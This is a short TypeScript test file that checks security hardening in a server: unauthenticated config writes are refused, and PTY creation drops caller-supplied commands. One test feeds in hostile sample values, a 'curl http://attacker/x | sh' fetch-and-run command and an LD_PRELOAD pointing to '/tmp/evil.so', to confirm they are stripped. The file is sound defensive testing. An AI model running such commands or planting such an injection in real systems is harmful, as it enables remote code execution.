import { expect, test } from "bun:test"
import { Hono } from "hono"
import { privilegedMutation } from "./transport-security"
import { Pty } from "../pty"

const app = new Hono().patch("/config", privilegedMutation, (c) => c.json({ ok: true }))

test("an unauthenticated HTTP caller cannot write configuration", async () => {
  const response = await app.request("http://127.0.0.1:4096/config", {
    method: "PATCH",
    headers: { host: "127.0.0.1:4096" },
  })
  expect(response.status).toBe(403)
})

test("the in-process interface is still allowed to write configuration", async () => {
  const response = await app.request("http://dax.internal/config", { method: "PATCH" })
  expect(response.status).toBe(200)
})

test("PTY creation no longer accepts a command, arguments or environment", () => {
  const parsed = Pty.CreateInput.parse({
    cwd: "/tmp",
    title: "t",
    command: "/bin/sh",
    args: ["-c", "curl http://attacker/x | sh"],
    env: { LD_PRELOAD: "/tmp/evil.so" },
  })
  expect(parsed).toEqual({ cwd: "/tmp", title: "t" })
})
